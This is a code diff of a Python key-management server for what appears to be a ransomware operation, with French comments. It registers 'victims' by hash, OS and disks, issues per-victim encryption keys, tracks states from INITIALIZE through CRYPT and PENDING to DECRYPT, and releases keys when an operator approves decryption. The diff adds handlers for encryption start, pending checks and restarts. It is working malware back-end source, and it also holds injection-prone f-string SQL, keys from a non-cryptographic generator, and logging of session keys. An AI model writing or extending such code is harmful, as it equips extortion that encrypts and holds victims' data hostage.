@@ -9,7 +9,6 @@ import utile.security as security
 import utile.config as config
 import time
 
-# Load configurations
 load = config.load_config('../configuration/config/serveur_cles.cfg', '../configuration/config/serveur_cles.key')
 AES_GCM = config.get_config('AES_GCM')
 DEBUG_MODE = config.get_config('DEBUG_MODE')
@@ -17,36 +16,29 @@ PORT_SERV_CONSOLE = int(config.get_config('PORT_SERV_CONSOLE'))
 PORT_SERV_FRONTAL = int(config.get_config('PORT_SERV_FRONTAL'))
 
 
-def generate_key(length=0, characters=string.ascii_letters + string.digits):
-    """
-    Generate a random key with given length and characters.
-    """
-    return ''.join(random.choice(characters) for _ in range(length))
+def generate_key(longueur=0, caracteres=string.ascii_letters + string.digits):
+    return ''.join(random.choice(caracteres) for i in range(longueur))
 
-
-def check_hash(conn, victim_hash):
+def check_hash(conn, hash_victim):
     """
-    Check if the victim's hash signature is already recorded in the DB.
-
-    :param conn: Database connection object
-    :param victim_hash: Victim's hash signature
-    :return: (list or None) Victim ID and key if found
+    Vérifie si la signature hash de la victime est déjà enregistré en DB
+    :param conn:
+    :param hash_victim: Signature de la victime
+    :return: (list ou None) id_victim et key si trouvé
     """
     query = f'''
-    SELECT victims.id_victim, victims.key
+    SELECT victims.id_victim,  victims.key
     FROM victims
-    WHERE victims.hash = "{victim_hash}"
+    WHERE victims.hash = "{hash_victim}"
     '''
     victim = data.select_data(conn, query)
     if not victim:
-        if DEBUG_MODE:
-            print(f"No victim found with hash: {victim_hash[-12:]}")
+        print(f"Pas de victime avec le hash : {hash_victim[-12:]}")
         return None
     else:
-        victim = list(victim[0])  # Convert tuple list to simple list
-        if DEBUG_MODE:
-            print(f"Victim with hash {victim_hash[-12:]} found in DB with ID {victim[0]}")
-        # Fetch the last state of the victim from the DB
+        victim = list(victim[0])    # Transforme la liste de tuples en une liste simple
+        print(f"Une victime avec le hash {hash_victim[-12:]} existe en DB sur l'ID {victim[0]}")
+        # Recherche le dernier état en DB pour cette victime
         query = f'''
         SELECT states.state, MAX(states.datetime)
         FROM states
@@ -55,106 +47,117 @@ def check_hash(conn, victim_hash):
         last_state = (data.select_data(conn, query))[0][0]
         victim.append(last_state)
         return victim
-
-
-def add_victim(db, id, os, disk, key):
-    """
-    Add a new victim to the database.
-    """
+def ajout_victim(db, id, os, disk, key):
     current_date = int(time.time())
+    # Insérer les données de la victime dans la table 'victims'
     data.insert_data(db, 'victims', '(os, hash, disks, key)', f'("{os}", "{id}", "{disk}", "{key}")')
-    victim_id = data.select_data(db, f'SELECT id_victim FROM victims WHERE hash = "{id}"')[0][0]
-    data.insert_data(db, 'states', '(id_victim, datetime, state)', f'({victim_id}, {current_date}, "INITIALIZE")')
-    return victim_id
-
-
-def handle_list_victim_request(conn_db, fifo_db, fifo_rep_console):
-    """
-    Handle the LIST_VICTIM_REQ message type.
-    """
-    list_victim = data.get_list_victims(conn_db)
-    for victim in list_victim:
-        msg = utile.message.set_message('list_victim_resp', victim)
-        fifo_rep_console.put(msg)
-        fifo_rep_console.join()
-    msg = utile.message.set_message('list_victim_end')
-    fifo_rep_console.put(msg)
-    fifo_rep_console.join()
-    fifo_db.task_done()
-
-
-def handle_history_request(conn_db, fifo_db, fifo_rep_console, msg):
-    """
-    Handle the HISTORY_REQ message type.
-    """
-    victim_id = msg['HIST_REQ']
-    histories = utile.data.get_list_history(conn_db, victim_id)
-    for history in histories:
-        msg = utile.message.set_message('history_resp', history)
-        fifo_rep_console.put(msg)
-        fifo_rep_console.join()
-    msg = utile.message.set_message('history_end', [victim_id])
-    fifo_rep_console.put(msg)
-    fifo_rep_console.join()
-    fifo_db.task_done()
-
-
-def handle_change_state(conn_db, fifo_db, msg):
-    """
-    Handle the CHANGE_STATE message type.
-    """
-    victim_id = msg['CHGSTATE']
-    utile.data.insert_data(conn_db, 'states', '(id_victim, datetime, state)',
-                           f"({victim_id}, {int(time.time())}, 'DECRYPT')")
-    fifo_db.task_done()
-    print("State change handled")
-
-
-def handle_initialize_request(conn_db, fifo_db, fifo_rep_front, msg):
-    """
-    Handle the INITIALIZE_REQ message type.
-    """
-    victim = check_hash(conn_db, msg['INITIALIZE'])
-    if victim is None:
-        key_victim = generate_key(512)
-        victim_id = add_victim(conn_db, msg['INITIALIZE'], msg['OS'], msg['DISKS'], key_victim)
-        victim = [victim_id, key_victim, 'INITIALIZE']
-    msg = utile.message.set_message('initialize_key', victim)
-    fifo_rep_front.put(msg)
-    fifo_rep_front.join()
+    # Sélectionner l'ID de la victime en fonction de son hash
+    id_victim = data.select_data(db, f'SELECT id_victim FROM victims WHERE hash = "{id}"')[0][0]
+    # Insérer l'état INITIALIZE pour la victime dans la table 'states'
+    data.insert_data(db, 'states', '(id_victim,datetime, state)', f'({id_victim},{current_date}, "INITIALIZE")')
+    # Retourner l'ID de la victime
+    return id_victim
 
 
 def main():
     """
-    Main function of the program.
-    Initializes the communication with the database, creates queues for requests,
-    and starts threads to handle requests from the front-end and console.
+    Fonction principale du programme.
+    Elle initialise la communication avec la base de données, crée des files d'attente pour les réponses,
+    et lance deux threads pour traiter les requêtes provenant du frontal et de la console.
     """
-    conn_db = data.connect_db()
-    fifo_db = queue.Queue()
-    fifo_rep_front = queue.Queue()
-    fifo_rep_console = queue.Queue()
+    connexion_db = data.connect_db()  # Connexion à la base de données
+    fifo_db = queue.Queue()  # File d'attente pour les requêtes vers la base de données
+    fifo_rep_front = queue.Queue()  # File d'attente pour les réponses vers le frontal
+    fifo_rep_console = queue.Queue()  # File d'attente pour les réponses vers la console
 
+    # Lancement des threads pour traiter les requêtes
     thread_front = Thread(target=thread_frontal, args=(fifo_db, fifo_rep_front), daemon=True).start()
-    thread_console = Thread(target=thread_console, args=(fifo_db, fifo_rep_console), daemon=True).start()
+    thread_cons = Thread(target=thread_console, args=(fifo_db, fifo_rep_console), daemon=True).start()
 
     while True:
-        msg = fifo_db.get()
-        msg_type = utile.message.get_message_type(msg)
+        msg = fifo_db.get()  # Récupération du message depuis la file d'attente
+        msg_type = utile.message.get_message_type(msg)  # Obtention du type de message
+        print("message 1 " + str(msg))
+        # Traitement en fonction du type de message
         if msg_type == 'LIST_VICTIM_REQ':
-            handle_list_victim_request(conn_db, fifo_db, fifo_rep_console)
-        elif msg_type == 'HISTORY_REQ':
-            handle_history_request(conn_db, fifo_db, fifo_rep_console, msg)
-        elif msg_type == 'CHANGE_STATE':
-            handle_change_state(conn_db, fifo_db, msg)
-        elif msg_type == 'INITIALIZE_REQ':
-            handle_initialize_request(conn_db, fifo_db, fifo_rep_front, msg)
-
+            print("Type du msg : " + str(msg_type))
+            list_victim = data.get_list_victims(connexion_db)
+            for victim in list_victim:
+                msg = utile.message.set_message('list_victim_resp', victim)
+                fifo_rep_console.put(msg)
+                fifo_rep_console.join()
+                # Fin de boucle on envoit list_victime_end dans la queue fifo de reponse console
+            msg = utile.message.set_message('list_victim_end')
+            fifo_rep_console.put(msg)
+            fifo_rep_console.join()
+            fifo_db.task_done()
+        if msg_type == 'HISTORY_REQ':
+            id_victim = msg['HIST_REQ']
+            print("id_victim : " + str(id_victim))
+            histories = utile.data.get_list_history(connexion_db, id_victim)
+            print(histories)
+            for history in histories:
+                print("historique de chaque : "+str(history))
+                # Envoi des messages history_resp
+                msg = utile.message.set_message('history_resp', history)
+                # Envoi du msg sur la queue q_response_console
+                fifo_rep_console.put(msg)
+                fifo_rep_console.join()
+            # Envoi du message history_end
+            msg = utile.message.set_message('history_end', [id_victim])
+            # Envoi du msg sur la queue q_response_console
+            fifo_rep_console.put(msg)
+            fifo_rep_console.join()
+            fifo_db.task_done()
+        if msg_type == 'CHANGE_STATE':
+            id_victim = msg['CHGSTATE']
+            print("state " + str(id_victim))
+            utile.data.insert_data(connexion_db, 'states', '(id_victim,datetime, state)',f"({id_victim},{int(time.time())}, 'DECRYPT')")
+            fifo_db.task_done()
+            print("Changement d'état")
+        if msg_type == 'INITIALIZE_REQ':
+            # Check si HASH existe déjà en DB
+            victim = check_hash(connexion_db, msg['INITIALIZE'])  # Retourne l'id_victim + key_victim + last_state
+            if victim is None:
+                # Génère la nouvelle clé
+                key_victim = generate_key(512)
+                # Enregistrement en DB de la nouvelle victime
+                id_victim = ajout_victim(connexion_db, msg['INITIALIZE'], msg['OS'], msg['DISKS'], key_victim)
+                victim = [id_victim, key_victim, 'INITIALIZE']
+            # Envoie du initialize_key
+            msg = utile.message.set_message('initialize_key', victim)
+            # Envoi du msg sur la queue q_response_console
+            print(f"Put msg {msg}")
+            fifo_rep_front.put(msg)
+            fifo_rep_front.join()
+        if msg_type == 'CRYPT_START':
+            id_victim = msg['CRYPT']
+            print("Ajout de l'état CRYPT a la db" + str(id_victim))
+            utile.data.insert_data(connexion_db, 'states', '(id_victim,datetime, state)',f"({id_victim},{int(time.time())}, 'CRYPT')")
+            fifo_db.task_done()
+        if msg_type == "PENDING_MSG":
+            victim = check_hash(connexion_db, msg['PENDING'])
+            print(victim)
+            if victim[2] == "CRYPT" or victim[2] == "INITIALIZE":
+                print("Ajout de l'état PENDING a la db")
+                utile.data.insert_data(connexion_db, 'states', '(id_victim,datetime, state)',
+                                       f"({victim[0]},{int(time.time())}, 'PENDING')")
+            if victim[2] == "DECRYPT":
+                print(msg)
+                msg = utile.message.set_message("DECRYPT_REQ", [msg['PENDING'],victim[1]])
+                print("envois de  " + str(msg))
+                fifo_rep_front.put(msg)
+                fifo_rep_front.join()
+        if msg_type == 'RESTART_REQ':
+            victim = check_hash(connexion_db, msg['RESTART'])
+            msg = utile.message.set_message("RESTART_RESP", [msg['RESTART'],victim[1]])
+            fifo_rep_front.put(msg)
+            fifo_rep_front.join()
 
 def thread_console(fifo_db, fifo_rep_console):
     """
-    Thread function to handle requests from the console.
-    Waits for requests, decrypts them, processes them, and sends responses.
+    Fonction exécutée dans un thread séparé pour traiter les requêtes provenant de la console.
+    Elle attend les requêtes, les déchiffre et les traite, puis envoie les réponses.
     """
     server_socket = network.start_net_serv(port=PORT_SERV_CONSOLE)
     while True:
@@ -163,10 +166,13 @@ def thread_console(fifo_db, fifo_rep_console):
             aes_key = security.diffie_hellman_send_key(socket_console)
             message = network.receive_message(socket_console)
             message = security.aes_decrypt(message, aes_key)
+            print("Message décrypté" + str(message))
             msg_type = utile.message.get_message_type(message)
+            print(f"Message du client : {message}")
+            print(f"Type : {msg_type}")
             if msg_type == 'LIST_VICTIM_REQ':
-                fifo_db.put(message)
-                message = fifo_rep_console.get()
+                fifo_db.put(message) # Dans la file d'attente db on envoit le message LIST_VICTIM_REQ
+                message = fifo_rep_console.get() #On récupere le message qu'envoit le serveur clé qui est dans la file d'attente
                 msg_type = utile.message.get_message_type(message)
                 while msg_type != 'LIST_VICTIM_END':
                     message = security.aes_encrypt(message, aes_key)
@@ -178,35 +184,39 @@ def thread_console(fifo_db, fifo_rep_console):
                 network.send_message(socket_console, message)
                 fifo_rep_console.task_done()
             elif msg_type == 'HISTORY_REQ':
-                fifo_db.put(message)
+                fifo_db.put(message)  # Envoie la requête dans la queue q_request
                 msg = fifo_rep_console.get()
                 msg_type = utile.message.get_message_type(msg)
-                while msg_type != 'HISTORY_END':
+                while msg_type != 'HISTORY_END':  # Envoie les historiques d'états
+                    # Envoi des messages history_resp
                     msg = security.aes_encrypt(msg, aes_key)
                     network.send_message(socket_console, msg)
                     fifo_rep_console.task_done()
                     msg = fifo_rep_console.get()
                     msg_type = utile.message.get_message_type(msg)
+                # Envoi du message history_end
                 msg = security.aes_encrypt(msg, aes_key)
                 network.send_message(socket_console, msg)
                 fifo_rep_console.task_done()
             elif msg_type == 'CHANGE_STATE':
-                fifo_db.put(message)
+                fifo_db.put(message)  # Envoie la requête dans la queue q_request
 
 
 def thread_frontal(fifo_db, fifo_rep_front):
     """
-    Thread function to handle requests from the front-end.
-    Waits for requests, decrypts them, processes them, and sends responses.
+    Fonction exécutée dans un thread séparé pour traiter les requêtes provenant du frontal.
+    Elle attend les requêtes, les déchiffre et les traite, puis envoie les réponses.
     """
-    server_socket = network.start_net_serv(port=PORT_SERV_FRONTAL)
+    s_serveur = network.start_net_serv(port=PORT_SERV_FRONTAL)
     while True:
-        socket_front, _ = server_socket.accept()
+        socket_front, _ = s_serveur.accept()
         aes_key = security.diffie_hellman_send_key(socket_front)
+        print("Clé : " + str(aes_key))
         while True:
             msg = network.receive_message(socket_front)
             msg = security.aes_decrypt(msg, aes_key)
             msg_type = utile.message.get_message_type(msg)
+            print("Message reçu : " + str(msg) + "Son type : " + str(msg_type))
             if msg_type == 'INITIALIZE_REQ':
                 fifo_db.put(msg)
                 msg = fifo_rep_front.get()
@@ -215,8 +225,27 @@ def thread_frontal(fifo_db, fifo_rep_front):
                     msg = security.aes_encrypt(msg, aes_key)
                     network.send_message(socket_front, msg)
                     fifo_rep_front.task_done()
+            if msg_type == 'CRYPT_START':
+                 fifo_db.put(msg)
+            if msg_type == "PENDING_MSG":
+                fifo_db.put(msg)
+                msg = fifo_rep_front.get()
+                msg = security.aes_encrypt(msg, aes_key)
+                network.send_message(socket_front,msg)
+                fifo_rep_front.task_done()
+            if msg_type == 'DECRYPT_REQ':
+                fifo_db.put(msg)
+                msg = fifo_rep_front.get()
+                msg = security.aes_encrypt(msg, aes_key)
+                network.send_message(socket_front,msg)
+                fifo_rep_front.task_done()
+            if msg_type == "RESTART_REQ":
+                fifo_db.put(msg)
+                msg = fifo_rep_front.get()
+                msg = security.aes_encrypt(msg, aes_key)
+                network.send_message(socket_front,msg)
+                fifo_rep_front.task_done()
 
-
-# Run the main function
+# Appel de la fonction principale
 if __name__ == "__main__":
     main()
